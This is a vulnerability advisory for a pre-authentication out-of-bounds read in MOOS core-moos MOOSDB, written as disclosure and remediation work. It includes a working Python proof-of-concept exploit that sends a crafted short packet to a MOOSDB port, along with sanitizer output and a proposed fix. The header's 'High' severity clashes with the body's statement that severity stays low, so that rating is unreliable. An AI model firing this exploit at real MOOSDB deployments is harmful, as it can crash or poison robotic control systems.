# MOOS core-moos: MOOSDB Out-of-Bounds Read via Short Packet

- **Advisory ID:** MCSAID-2026-041
- **CVE ID:** [CVE-2026-85455](https://www.cve.org/CVERecord?id=CVE-2026-85455)
- **Published:** 2026-09-01
- **Severity:** High (CVSS 8.2 – CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H)
- **CVSS 4.0:** 8.8 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:H/SC:N/SI:N/SA:N)
- **Vulnerability type:** Out-of-bounds Read
- **Current state:** No fixed release; proposed fix submitted upstream in [Pull Request #75](https://github.com/themoos/core-moos/pull/75) (not merged)
- **Software:** [MOOS core-moos](https://github.com/themoos/core-moos)
- **CWE:** [CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

`CMOOSCommPkt` allocates exactly four bytes in its constructor, and a declared outer length of four makes the packet look complete after those four bytes arrive. The deserialiser then unconditionally reads the four-byte message count from offset four, four bytes past the end of the allocation, before the peer has authenticated.

---

## Affected Versions

| Version | Status |
|---------|--------|
| core-moos <= 10.4.0 | Vulnerable |

Tested against: core-moos `v10.4.0-49-gec9c77c` (commit `ec9c77c68fcbdef8f5e4c60fe243acd223433f0c`), latest master; and MOOS-IvP `1de9ae146cd63c209e8c3fd81611a4ed2472971b`, latest master, which bundles the same code.

---

## Impact

A 4-byte heap out-of-bounds read, pre-authentication.  On a normal build the
value read is allocator padding and the connection is simply poisoned, so the
practical impact is low; on a hardened allocator, a MTE/tagged build, or a
different heap layout it is a crash.  Severity stays low.

---

## Exploitation

An unauthenticated TCP peer.

Preconditions:

* TCP reachability to the MOOSDB port. The read happens inside HandShake().

---

## Details

### Affected code

Each affected file is listed twice: first at its path in **core-moos** git master (commit `ec9c77c`), which is where a fix has to land, then at its path inside the copy bundled in MOOS-IvP under `MOOS_Jul2724/MOOSCore`. The two copies are byte-identical unless stated otherwise.

* **`Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 48-56: the constructor allocates exactly sizeof(int) == 4 bytes
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 48-56: the constructor allocates exactly sizeof(int) == 4 bytes
* **`Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 110-115: GetBytesRequired() returns m_nMsgLen - m_nByteCount, which is 0 when the declared length is 4, so the packet is treated as complete
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 110-115: GetBytesRequired() returns m_nMsgLen - m_nByteCount, which is 0 when the declared length is 4, so the packet is treated as complete
* **`Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 214-228: Serialize(..., false) unconditionally memcpys the 4-byte message count from m_pStream + sizeof(int)
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Comms/MOOSCommPkt.cpp`** - lines 214-228: Serialize(..., false) unconditionally memcpys the 4-byte message count from m_pStream + sizeof(int)

### Root cause

`CMOOSCommPkt`'s constructor allocates exactly four bytes.  A declared outer
length of 4 (through 7) makes `GetBytesRequired()` return zero once those four
bytes have arrived, so `ReadPkt` declares the packet complete.  The
deserialiser then reads the message count from offset 4 - four bytes past the
end of a four-byte heap allocation - because the 9-byte structural header is
never required to be present.

---

## Reproduction

### Test environment

Ubuntu 24.04, x86-64, gcc 13.3.0, cmake 3.28.3, FLTK 1.3.8, Python 3.14.

All four MOOS repositories were built from source with their default settings -
Release `-O2`, and every resulting binary is a hardened PIE with a stack canary,
FORTIFY, NX and full RELRO:

| Repository | Version | Built with |
| --- | --- | --- |
| core-moos | `v10.4.0-49-gec9c77c` (`ec9c77c`) | `cmake .. && make` |
| essential-moos | `10.0.1-release-22-gb897ea8` (`b897ea8`) | `cmake -DMOOS_DIR=<core-moos build> .. && make` |
| ui-moos | commit `50b9c6c` | `cmake -DBUILD_GRAPHICAL_TOOLS=ON -DBUILD_UMS=ON -DMOOS_DIR=<core-moos build> .. && make` |
| MOOS-IvP | `1de9ae146cd63c209e8c3fd81611a4ed2472971b` | `./build-moos.sh && ./build-ivp.sh` |

The affected code lives in **core-moos** (`v10.4.0-49-gec9c77c`, commit `ec9c77c`) and is also bundled inside MOOS-IvP under `MOOS_Jul2724/MOOSCore`. Both copies were checked; unless noted otherwise in the text they are byte-identical, so a fix belongs in core-moos and MOOS-IvP needs to pick it up.

#### Tested / reproduced

Yes - reproduced against standalone core-moos `v10.4.0-49-gec9c77c`. The stock hardened build survives (the read returns allocator padding and the connection is poisoned); the sanitised core-moos build reports the out-of-bounds read at `Core/libMOOS/Comms/MOOSCommPkt.cpp:228`.

### Steps and results

Thirty-six bytes on the wire (protocol string plus `0x00000004`):

*Stock build*: no crash; the server replied with a `MOOS_POISON` message built
from whatever the out-of-bounds read returned.

*ASan build*:

    ==...==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 4
        #1 CMOOSCommPkt::Serialize(...) MOOSCommPkt.cpp:228
    allocated by thread T5 here:
        #1 CMOOSCommPkt::CMOOSCommPkt() MOOSCommPkt.cpp:50
    SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy

MOOSDB exited with status 1.

### Proof of concept

Standalone and self-contained - Python 3 standard library only (or a POSIX shell). It attacks an already-running production
binary and does **not** start the target itself; the launch
commands are in the header comment.

```python
#!/usr/bin/env python3
"""
MOOSDB short packet - pre-authentication 4-byte heap out-of-bounds read

CMOOSCommPkt's constructor allocates exactly sizeof(int) == 4 bytes:

    m_nStreamSpace = sizeof(int);                    // MOOSCommPkt.cpp:50
    m_pStream = new unsigned char [m_nStreamSpace];

A declared outer length of 4 (through 7) makes GetBytesRequired() return zero
once those four bytes have arrived, so ReadPkt declares the packet complete:

    int CMOOSCommPkt::GetBytesRequired() {
        if (m_nByteCount < (int) sizeof(int))
            return sizeof(int) - m_nByteCount;
        return m_nMsgLen - m_nByteCount;             // 4 - 4 == 0
    }

Serialize(..., false) then reads the message count from offset 4
UNCONDITIONALLY - four bytes past the end of a four-byte heap allocation -
because the nine-byte structural header is never required to be present:

    memcpy((void*)(&nMessages), (void*) m_pNextData, sizeof(nMessages));
                                                     // MOOSCommPkt.cpp:228

The whole path runs inside CMOOSCommServer::HandShake(), i.e. pre-auth.

TARGET
------
A running MOOSDB.

HOW TO LAUNCH THE TARGET (this exploit does NOT launch anything itself)
    # stock build: the read is silent (allocator padding), and the server
    # replies with a POISON message built from whatever it read
    /path/to/core-moos/build/bin/MOOSDB --moos_port=9000

    # sanitised build: the read is reported and the process aborts
    cd /path/to/core-moos && mkdir -p build-asan && cd build-asan
    cmake -DCMAKE_BUILD_TYPE=Debug \
          -DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -g -O1" \
          -DCMAKE_C_FLAGS="-fsanitize=address,undefined -g -O1" ..
    make MOOSDB -j"$(nproc)"
    ASAN_OPTIONS=abort_on_error=0 ./bin/MOOSDB --moos_port=9000

USAGE
-----
    ./exploit.py [host] [port] [declared_length]
    ./exploit.py 127.0.0.1 9000 4
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9000
DECL = int(sys.argv[3]) if len(sys.argv) > 3 else 4
HELLO = b"ELKS CAN'T DANCE 2/8/10".ljust(32, b'\x00')

def up():
    try:
        socket.create_connection((HOST, PORT), timeout=2).close()
        return True
    except OSError:
        return False

print("[*] target %s:%d up: %s" % (HOST, PORT, up()))
print("[*] sending the 32-byte handshake, then a 4-byte length field of %d"
      % DECL)
print("    GetBytesRequired() -> %d - 4 = %d, so the packet is 'complete'"
      % (DECL, DECL - 4))
print("    Serialize() then reads 4 bytes at m_pStream + 4, past the end of a")
print("    4-byte allocation")

s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(HELLO)
s.sendall(struct.pack('<i', DECL))
try:
    r = s.recv(256)
    print("\n    server replied with %d bytes:" % len(r))
    print("      %s" % r[:80].hex())
    if len(r) >= 14 and r[13:14] == b'K':
        print("      (message type 'K' = MOOS_POISON, built from whatever the")
        print("       out-of-bounds read returned)")
except OSError as e:
    print("\n    no reply (%s)" % e)
s.close()

time.sleep(1.5)
alive = up()
print("\n[%s] MOOSDB still listening: %s" % ("-" if alive else "+", alive))
print("""
====================================================================
IMPACT
  A 4-byte heap out-of-bounds read, pre-authentication.  On a normal build the
  value read is allocator padding and the connection is merely poisoned, so the
  practical impact is low; on a hardened allocator, a tagged-memory build or a
  different heap layout it is a crash.
  Sanitised build:
    ERROR: AddressSanitizer: heap-buffer-overflow
    READ of size 4
      #1 CMOOSCommPkt::Serialize(...)  MOOSCommPkt.cpp:228
    allocated by thread T5 here:
      #1 CMOOSCommPkt::CMOOSCommPkt()  MOOSCommPkt.cpp:50
  The same range check that fixes [MCSAID-2026-026](./MCSAID-2026-026-core-moos-moosdb-pre-authentication-heap-overflow-via-negative-packet-length.md) and [MCSAID-2026-028](./MCSAID-2026-028-core-moos-moosdb-denial-of-service-via-unbounded-packet-allocation.md) fixes this one too.
====================================================================""")

```

---

## Mitigations

A fix has been proposed upstream but has not been merged at the time of writing:

- Pull request: [Pull Request #75](https://github.com/themoos/core-moos/pull/75)
- Proposed fix commit: [d30c14585753](https://github.com/themoos/core-moos/commit/d30c14585753f9ae39749d9628ed15c8383f0568)

### Recommended fix

Require the full structural header before declaring a packet complete: treat
any declared length below `2*sizeof(int)+1` as a protocol error and close the
connection.  Bounds-check every fixed-width read against `m_nByteCount` in
`Serialize`.  The same range check fixes [MCSAID-2026-028](./MCSAID-2026-028-core-moos-moosdb-denial-of-service-via-unbounded-packet-allocation.md), [MCSAID-2026-022](./MCSAID-2026-022-essential-moos-pmoosbridge-heap-corruption-via-negative-udp-length.md) and [MCSAID-2026-026](./MCSAID-2026-026-core-moos-moosdb-pre-authentication-heap-overflow-via-negative-packet-length.md) together.

---

## Recommendations

- Apply the proposed fix from [Pull Request #75](https://github.com/themoos/core-moos/pull/75) until an official upstream release contains it.
- MOOS has no authentication or transport security; only expose MOOSDB and inter-community (pShare / pMOOSBridge / uFld*) ports on isolated, trusted networks and filter them at the network boundary.

---

## Timeline

- 2026-09-01 – CVE-2026-85455 published
- 2026-10-13 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-85455](https://www.cve.org/CVERecord?id=CVE-2026-85455)
- VulnCheck advisory: [MOOS core-moos through 10.4.0 MOOSDB Out-of-Bounds Read via Short Packet](https://www.vulncheck.com/advisories/moos-core-moos-through-10.4.0-moosdb-out-of-bounds-read-via-short-packet)
- Upstream pull request: [Pull Request #75](https://github.com/themoos/core-moos/pull/75)
- Proposed fix commit: [d30c14585753f9ae39749d9628ed15c8383f0568](https://github.com/themoos/core-moos/commit/d30c14585753f9ae39749d9628ed15c8383f0568)
- Marlink Cyber Security Advisory: [MCSAID-2026-041](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-041-core-moos-moosdb-out-of-bounds-read-via-short-packet.md)
- Software: [MOOS core-moos](https://github.com/themoos/core-moos)
